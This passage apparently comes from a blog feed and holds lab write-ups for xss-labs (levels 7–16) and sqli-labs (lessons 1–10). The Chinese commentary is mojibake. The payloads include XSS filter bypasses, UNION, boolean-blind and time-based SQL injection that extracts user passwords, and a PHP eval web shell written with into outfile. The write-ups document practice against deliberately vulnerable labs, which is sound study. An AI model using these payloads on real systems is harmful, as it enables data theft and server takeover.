class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">payloadï¼šurl/?keyword=&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">scrscriptipt</span>&gt;</span>alert()<span class="hljs-tag">&lt;/<span class="hljs-name">scrscriptipt</span>&gt;</span>&lt;&quot;<br></code></pre></td></tr></table></figure><h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ï¼Œå¹¶å°†å­—ç¬¦ä¸²ä¸­çš„scriptæ›¿æ¢ä¸ºäº†scr_iptï¼Œä¸”inputæ ‡ç­¾ä¸­valueçš„å€¼ç»è¿‡äº†htmlspecialcharsè½¬ä¹‰</p><p>é‚£è¿™é‡Œè¿˜æ˜¯è¦æƒ³åŠæ³•åˆ©ç”¨aæ ‡ç­¾ï¼Œäº†è§£åˆ°</p><blockquote><p>æµè§ˆå™¨åœ¨å¤„ç†hrefå±æ€§æ—¶ä¼šè‡ªåŠ¨è§£æ<a href="https://config.net.cn/tools/HtmlEncode.html">HTMLå®ä½“ç¼–ç </a></p></blockquote><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">payloadï¼šurl/?<span class="hljs-built_in">keyword</span>=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;<br></code></pre></td></tr></table></figure><h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>ä¸€ç›´é“¾æ¥ä¸åˆæ³•ï¼Œçœ‹ä¸€ä¸‹æºç </p><p><img src="/../images/xss-labs/level9_1.png"></p><p>ä¹Ÿå°±æ˜¯è¾“å…¥ä¸­åº”è¯¥åŒ…å«http:&#x2F;&#x2F;ï¼Œå°†å®ƒåŠ åœ¨æ„é€ çš„å­—ç¬¦ä¸²æœ«å°¾å¹¶æ³¨é‡Š</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">payloadï¼šurl/?<span class="hljs-built_in">keyword</span>=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;<span class="hljs-comment">/*http://*/</span><br></code></pre></td></tr></table></figure><h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><p>å‘ç°éšè—è¡¨å•å­—æ®µ</p><p><img src="/../images/xss-labs/level10_1.png"></p><p>å°è¯•è¿›è¡Œä¼ å‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">url/?keyword=&lt;script&gt;alert()&lt;/script&gt;&amp;t_link=<span class="hljs-built_in">test</span>&amp;t_history=<span class="hljs-built_in">test</span>&amp;t_sort=<span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥ç”¨t_sortè¿™ä¸ªå­—æ®µè¿›è¡Œæ³¨å…¥</p><p><img src="/../images/xss-labs/level10_2.png"></p><p>å°†å¤§äºå·å’Œå°äºå·æ›¿æ¢ä¸ºç©ºäº†ï¼Œé‚£å°±è¦ç”¨é¼ æ ‡äº‹ä»¶å»è¿›è¡Œè§¦å‘</p><p>ä½†æ˜¯è¿™ä¸ªå­—æ®µæ˜¯hiddençš„ï¼Œå¯ä»¥åŠ ä¸€ä¸ªtypeå»å°†åä¸€ä¸ªtypeå»è¦†ç›–ï¼ˆåœ¨ç½‘ä¸Šçœ‹åˆ°èµ„æ–™è¯´åé¢çš„æ ·å¼ä¼šå°†å‰é¢çš„æ ·å¼è¦†ç›–ï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œæœ€ååº”è¯¥è¿˜æ˜¯hiddenï¼Œä½†æ˜¯æˆ‘è‡ªå·±æœ¬åœ°è¯•äº†ä¸€ä¸‹ï¼Œå®é™…æ˜¯textï¼‰</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">payloadï¼šurl/?<span class="hljs-attribute">t_sort</span>=<span class="hljs-string">&quot; onclick=alert() type=&quot;</span>text<br></code></pre></td></tr></table></figure><h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><p>å‘ç°éšè—è¡¨å•å­—æ®µï¼Œè¿™æ¬¡å¤šäº†ä¸€ä¸ªt_refå­—æ®µï¼Œä¸”å…¶å€¼æ˜¯ä¸Šä¸€æ¬¡æäº¤çš„url</p><p><img src="/../images/xss-labs/level11_1.png"></p><p>çœ‹ä¸€ä¸‹Refererå¤´</p><p><img src="/../images/xss-labs/level11_2.png"></p><p>ä¹Ÿå°±æ˜¯t_refè¿™ä¸ªinputæ ‡ç­¾çš„valueå€¼å°±æ˜¯Refererå¤´çš„å€¼ï¼Œç›´æ¥ä¿®æ”¹Refererå¤´</p><p><img src="/../images/xss-labs/level11_3.png"></p><h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><p>å‘ç°éšè—è¡¨å•å­—æ®µï¼Œè¿™æ¬¡å¤šäº†ä¸€ä¸ªt_uaå­—æ®µï¼Œåº”è¯¥æ˜¯uaå¤´çš„å€¼</p><p><img src="/../images/xss-labs/level12_1.png"></p><p>ç›´æ¥ä¿®æ”¹uaå¤´</p><p><img src="/../images/xss-labs/level12_2.png"></p><h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><p>å‘ç°éšè—è¡¨å•ï¼Œè¿™æ¬¡å¤šäº†ä¸€ä¸ªt_cookå­—æ®µï¼Œåº”è¯¥æ˜¯cookieçš„å€¼</p><p><img src="/../images/xss-labs/level13_1.png"></p><p>ç›´æ¥ä¿®æ”¹cookie</p><p><img src="/../images/xss-labs/level13_2.png"></p><h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><p>è¿™å…³å¥½åƒæ˜¯é€šè¿‡ä¿®æ”¹iframeè°ƒç”¨çš„æ–‡ä»¶æ¥å®ç°xssï¼Œä½†æ˜¯å¯¹åº”ç½‘ç«™å¥½åƒæŒ‚æ‰äº†</p><h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><p>ä¾æ—§æ˜¯æŸ¥çœ‹æºç ï¼Œå‘ç°ng-include</p><p><img src="/../images/xss-labs/level15_1.png"></p><p>äº†è§£ä¸€ä¸‹</p><blockquote><p>ng-includeï¼šAngularJS æ¡†æ¶é‡Œçš„ä¸€ä¸ªæŒ‡ä»¤ï¼Œå…¶ä½œç”¨æ˜¯æŠŠå¤–éƒ¨çš„ HTML æ¨¡æ¿åµŒå…¥åˆ°å½“å‰ DOM ä¸­ã€‚</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´ng-includeæ˜¯ç”¨æ¥è¿›è¡Œæ–‡ä»¶åŒ…å«çš„ï¼ŒæŠŠå¤–éƒ¨çš„htmlæ¨¡æ¿åµŒå…¥åˆ°å½“å‰é¡µé¢ä¸­</p><p>å°è¯•åŒ…å«level1</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">url<span class="hljs-regexp">/?src=&quot;http:/</span><span class="hljs-regexp">/192.168.253.150/</span>xss/level1.php?name=test<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/../images/xss-labs/level15_2.png"></p><p>å¹¶æ²¡æœ‰å‘ç°æœ‰å‘ç”Ÿä»€ä¹ˆ</p><p>å°è¯•å¼¹çª—</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">url/?src=&#x27;http://192.168.253.150/xss/level1.php?name=test<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">alert()</span>&gt;</span>&#x27;<br></code></pre></td></tr></table></figure><p>å¤±è´¥ï¼Œçœ‹äº†ä¸€ä¸‹å…¶ä»–å¸ˆå‚…çš„wpï¼Œè¿˜æœ‰ç›´æ¥é€šè¿‡åŒ…å«å…¶ä»–levelçš„phpæ–‡ä»¶è¿›è¡Œå¼¹çª—çš„ï¼Œæˆ‘è¯•äº†ä¸€ä¸‹ï¼Œä¹Ÿæ²¡æœ‰æˆåŠŸï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯ç¯å¢ƒé—®é¢˜</p><h2 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h2><p>å°†scriptã€&#x2F;ã€ç©ºæ ¼ç­‰æ›¿æ¢ä¸ºäº†<code>&amp;nbsp;</code></p><p><img src="/../images/xss-labs/level16_1.png"></p><p>åˆ©ç”¨imgæ ‡ç­¾ï¼Œç”¨%0aä»£æ›¿ç©ºæ ¼</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">payload</span>ï¼šurl/?keyword=&lt;img%<span class="hljs-number">0</span>asrc=<span class="hljs-number">1</span>%<span class="hljs-number">0</span>aonerror=alert()&gt;<br></code></pre></td></tr></table></figure><h2 id="level17-level20"><a href="#level17-level20" class="headerlink" title="level17-level20"></a>level17-level20</h2><p>flashçš„åˆ©ç”¨ï¼Œæš‚ä¸”ä¸åš</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs</title>
    <link href="/2025/07/22/sqli-labs/"/>
    <url>/2025/07/22/sqli-labs/</url>
    
    <content type="html"><![CDATA[<h2 id="Basic-Challenge"><a href="#Basic-Challenge" class="headerlink" title="Basic Challenge"></a>Basic Challenge</h2><h3 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h3><p>getä¼ å‚id&#x3D;1</p><p><img src="/../images/sqli-labs/less1_1.png"></p><p>å°è¯•åŠ ä¸€ä¸ªå•å¼•å·</p><p><img src="/../images/sqli-labs/less1_2.png"></p><p>å¯ä»¥çœ‹åˆ°æ„é€ åçš„sqlè¯­å¥â€™1â€™â€™ LIMIT 0,1ä¸­å¤šäº†ä¸€ä¸ªå•å¼•å·</p><p>ä¼ å…¥id&#x3D;1â€™â€“+ï¼Œå°†åé¢å†…å®¹æ³¨é‡Š</p><p><img src="/../images/sqli-labs/less1_3.png"></p><p>è¿”å›äº†æ­£å¸¸æ•°æ®</p><p>æ¥ä¸‹æ¥åˆ©ç”¨order byç¡®å®šå­—æ®µæ•°</p><p>order by 3è¿”å›äº†æ­£å¸¸æ•°æ®ï¼Œorder by 4è¿”å›æŠ¥é”™ä¿¡æ¯ï¼Œç¡®å®šå­—æ®µæ•°ä¸º3</p><p><img src="/../images/sqli-labs/less1_4.png"></p><p>æ¥ä¸‹æ¥ä¼ å…¥id&#x3D;-1â€™ union select 1,2,3â€“+ç¡®å®šå›æ˜¾ä½</p><p><img src="/../images/sqli-labs/less1_5.png"></p><p>å›æ˜¾ä½æ˜¯2å’Œ3ï¼Œç„¶åæŸ¥çœ‹æ•°æ®åº“ä¿¡æ¯</p><p><img src="/../images/sqli-labs/less1_6.png"></p><p>çˆ†è¡¨å</p><p><img src="/../images/sqli-labs/less1_7.png"></p><p>çˆ†usersè¡¨çš„å­—æ®µ</p><p><img src="/../images/sqli-labs/less1_8.png"></p><p>æŸ¥æ•°æ®</p><p><img src="/../images/sqli-labs/less1_9.png"></p><h3 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h3><p>ä¼ å…¥id&#x3D;1abcï¼Œè¿”å›æŠ¥é”™ä¿¡æ¯ï¼Œæ•°å­—å‹æ³¨å…¥</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>//ç¡®å®šå›æ˜¾ä½<br>id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),version()//æŸ¥è¯¢æ•°æ®åº“ä¿¡æ¯<br>id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>),<span class="hljs-number">3</span>//çˆ†è¡¨å<br>id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">3</span>//çˆ†å­—æ®µ<br>id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-comment">--+//æŸ¥æ•°æ®</span><br></code></pre></td></tr></table></figure><h3 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h3><p>ä¼ å…¥id&#x3D;1abcï¼Œè¿”å›æ­£å¸¸æ•°æ®ï¼Œå­—ç¬¦å‹æ³¨å…¥</p><p>ä¼ å…¥id&#x3D;1â€™ï¼Œè¿”å›æŠ¥é”™ä¿¡æ¯â€™1â€™â€™) LIMIT 0,1ï¼Œé—­åˆæ–¹å¼æ˜¯â€™)</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs q">id=<span class="hljs-number">-1</span>&#x27;) <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>--+<span class="hljs-comment">//ç¡®å®šå›æ˜¾ä½</span><br>id=<span class="hljs-number">-1</span>&#x27;) <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),version()--+<span class="hljs-comment">//æŸ¥è¯¢æ•°æ®åº“ä¿¡æ¯</span><br>id=<span class="hljs-number">-1</span>&#x27;) <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=&#x27;security&#x27;),<span class="hljs-number">3</span>--+<span class="hljs-comment">//çˆ†è¡¨å</span><br>id=<span class="hljs-number">-1</span>&#x27;) <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-built_in">where</span> table_schema=&#x27;security&#x27; <span class="hljs-built_in">and</span> table_name=&#x27;users&#x27;),<span class="hljs-number">3</span>--+<span class="hljs-comment">//çˆ†å­—æ®µ</span><br>id=<span class="hljs-number">-1</span>&#x27;) <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>, username, password <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>--+<span class="hljs-comment">//çˆ†æ•°æ®</span><br></code></pre></td></tr></table></figure><h3 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h3><p>ä¼ å…¥id&#x3D;1abcï¼Œè¿”å›æ­£å¸¸æ•°æ®ï¼Œå­—ç¬¦å‹æ³¨å…¥</p><p>ä¼ å…¥id&#x3D;1â€ï¼Œè¿”å›æŠ¥é”™ä¿¡æ¯â€1â€â€) LIMIT 0,1ï¼Œé—­åˆæ–¹å¼æ˜¯â€)</p><p>å°†less3çš„payloadä¸­çš„â€™)æ›¿æ¢æˆâ€)å³å¯</p><h3 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h3><p>ä¼ å…¥id&#x3D;1abcï¼Œè¿”å›æ­£å¸¸æ•°æ®ï¼Œå­—ç¬¦å‹æ³¨å…¥</p><p>ä¼ å…¥id&#x3D;1â€™ï¼Œè¿”å›æŠ¥é”™ä¿¡æ¯â€™1â€™â€™ LIMIT 0,1ï¼Œé—­åˆæ–¹å¼æ˜¯â€™</p><p>ä½†æ˜¯æ— è®ºä¼ å…¥çš„idå€¼ä¸ºæ•°å­—å‡ ï¼Œé¡µé¢åªæ‰“å°å‡ºä¸¤ç§ç»“æœâ€You are inâ€¦â€¦â€¦..â€æˆ–ç©º</p><p>åˆ©ç”¨å¸ƒå°”ç›²æ³¨</p><p>çˆ†æ•°æ®åº“åé•¿åº¦</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-built_in">length</span>(database())=<span class="hljs-number">4</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>æ•°æ®åº“åé•¿åº¦ä¸º8</p><p><img src="/../images/sqli-labs/less5_1.png"></p><p>çˆ†æ•°æ®åº“å</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>&#x27; and (ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))=<span class="hljs-number">32</span>--+<br></code></pre></td></tr></table></figure><p>æ•°æ®åº“åasciiç åˆ†åˆ«ä¸ºï¼š115 101 99 117 114 105 116 121(security)</p><p><img src="/../images/sqli-labs/less5_2.png"></p><p>çˆ†è¡¨çš„æ•°é‡</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> (select count(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span>)=4--+<br></code></pre></td></tr></table></figure><p>è¡¨çš„æ•°é‡ä¸º4</p><p><img src="/../images/sqli-labs/less5_3.png"></p><p>çˆ†è¡¨å</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>&#x27; and (ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))=<span class="hljs-number">32</span>--+<br></code></pre></td></tr></table></figure><p>ç”¨bpæŠ“åŒ…åè¿›è¡Œçˆ†ç ´</p><p><img src="/../images/sqli-labs/less5_4.png"></p><p>çˆ†å­—æ®µæ•°</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> (select count(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>)=4--+<br></code></pre></td></tr></table></figure><p>å­—æ®µæ•°ä¸º3</p><p><img src="/../images/sqli-labs/less5_5.png"></p><p>çˆ†å­—æ®µ</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> (ascii(substr((select column_name <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> limit 0,1),1,1)))=32--+<br></code></pre></td></tr></table></figure><p>çˆ†æ•°æ®</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>&#x27; and (ascii(substr((select password from users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))=<span class="hljs-number">68</span>--+<br></code></pre></td></tr></table></figure><h3 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h3><p>ä¼ å…¥id&#x3D;1â€ï¼Œè¿”å›æŠ¥é”™ä¿¡æ¯â€1â€â€ LIMIT 0,1ï¼Œé—­åˆæ–¹å¼æ˜¯â€</p><p>ä½†æ˜¯æ— è®ºä¼ å…¥çš„idå€¼ä¸ºæ•°å­—å‡ ï¼Œé¡µé¢åªæ‰“å°å‡ºä¸¤ç§ç»“æœâ€You are inâ€¦â€¦â€¦..â€æˆ–ç©º</p><p>å’Œless5ä¸€æ ·å¸ƒå°”ç›²æ³¨ï¼Œå°†less5çš„payloadçš„é—­åˆæ–¹å¼æ”¹ä¸ºâ€å³å¯</p><h3 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h3><p>é—­åˆæ–¹å¼æ˜¯â€™))ï¼Œä¸”æ— è®ºä¼ å…¥çš„idå€¼ä¸ºæ•°å­—å‡ ï¼Œé¡µé¢åªæ‰“å°å‡ºä¸¤ç§ç»“æœâ€You are inâ€¦. Use outfileâ€¦â€¦â€æˆ–ç©ºï¼Œå¯ä»¥ç”¨å¸ƒå°”ç›²æ³¨</p><p><img src="/../images/sqli-labs/less7_1.png"></p><p>ä½†æ˜¯less7çš„åå­—æ˜¯Dump into outfileï¼Œåº”è¯¥æ˜¯è¦ç”¨æ–‡ä»¶å¯¼å…¥çš„æ–¹å¼è¿›è¡Œæ³¨å…¥</p><p>åˆ©ç”¨select â€¦ into outfileå†™å…¥ä¸€å¥è¯æœ¨é©¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">id=<span class="hljs-number">1</span><span class="hljs-string">&#x27;)) union select 1,2,&#x27;</span><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]); <span class="hljs-meta">?&gt;</span><span class="hljs-string">&#x27; into outfile &#x27;</span>C:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs\\Less-<span class="hljs-number">7</span>\\shell.php<span class="hljs-string">&#x27;--+</span><br></code></pre></td></tr></table></figure><p><img src="/../images/sqli-labs/less7_2.png"></p><p>é¡µé¢è™½ç„¶æŠ¥é”™ï¼Œä½†æ˜¯æ–‡ä»¶æˆåŠŸåˆ›å»º</p><p><img src="/../images/sqli-labs/less7_3.png"></p><blockquote><p>å¦‚æœå†™å…¥å¤±è´¥ï¼Œåº”è¯¥æ˜¯æƒé™å¤ªä½äº†ï¼Œå¯ä»¥åœ¨mysqlçš„my.inié…ç½®æ–‡ä»¶ä¸­åŠ å…¥secure_file_priv&#x3D;â€&#x2F;â€œ</p></blockquote><p>è®¿é—®é¡µé¢æµ‹è¯•ä¸€ä¸‹</p><p><img src="/../images/sqli-labs/less7_4.png"></p><p>å¯ä»¥ç›´æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œæˆ–ç”¨ä¸€äº›webshellç®¡ç†å·¥å…·è¿›è¡Œè¿æ¥</p><h3 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h3><p>æ²¡æœ‰äº†æŠ¥é”™ä¿¡æ¯ï¼Œä½†æ˜¯é—­åˆæ–¹å¼è¿˜æ˜¯å¾ˆå¥½æµ‹å‡ºæ¥çš„</p><p><img src="/../images/sqli-labs/less8_1.png"></p><p>å’Œless5ä¸€æ ·è¿›è¡Œå¸ƒå°”ç›²æ³¨</p><h3 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h3><p>æ— è®ºä¼ å…¥ä»€ä¹ˆï¼Œé¡µé¢å†…å®¹éƒ½ä¸å‘ç”Ÿæ”¹å˜ï¼Œæ— æ³•ç›´æ¥åˆ¤æ–­æ„é€ çš„sqlè¯­å¥æ˜¯å¦è¢«æ­£ç¡®æ‰§è¡Œï¼Œåˆ©ç”¨å»¶æ—¶æ³¨å…¥</p><p>é—­åˆæ–¹å¼ä¸ºâ€™</p><p><img src="/../images/sqli-labs/less9_1.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>&#x27; and if((length(database())=<span class="hljs-number">8</span>), sleep(<span class="hljs-number">5</span>), <span class="hljs-number">1</span>)--+//è·å–æ•°æ®åº“åé•¿åº¦<br><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>&#x27; and if(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">32</span>, sleep(<span class="hljs-number">5</span>), <span class="hljs-number">1</span>)--+//è·å–æ•°æ®åº“å<br><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>&#x27; and if((select count(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)=<span class="hljs-number">4</span>, sleep(<span class="hljs-number">5</span>), <span class="hljs-number">1</span>)--+//è·å–è¡¨çš„æ•°é‡<br><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">32</span>, sleep(<span class="hljs-number">5</span>), <span class="hljs-number">1</span>)--+//è·å–è¡¨å<br><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>&#x27; and if((select count(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;)=<span class="hljs-number">4</span>, sleep(<span class="hljs-number">5</span>), <span class="hljs-number">1</span>)--+//è·å–å­—æ®µæ•°<br><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>&#x27; and if((ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))=<span class="hljs-number">32</span>, sleep(<span class="hljs-number">5</span>), <span class="hljs-number">1</span>)--+//è·å–å­—æ®µ<br><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>&#x27; and if((ascii(substr((select password from users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))=<span class="hljs-number">68</span>, sleep(<span class="hljs-number">5</span>), <span class="hljs-number">1</span>)--+//è·å–æ•°æ®<br></code></pre></td></tr></table></figure><h3 id="less10"><a href="#less10" class="headerlink" title="less10"></a>less10</h3><p>é—­åˆæ–¹å¼â€</p><p><img src="/../images/sqli-labs/less10_1.png"></p><p>ç”¨å»¶æ—¶æ³¨å…¥ï¼ŒåŒless9</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>sql_injection</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>upload_labs</title>
    <link href="/2025/07/19/upload-labs/"/>
    <url>/2025/07/19/upload-labs/</url>
    
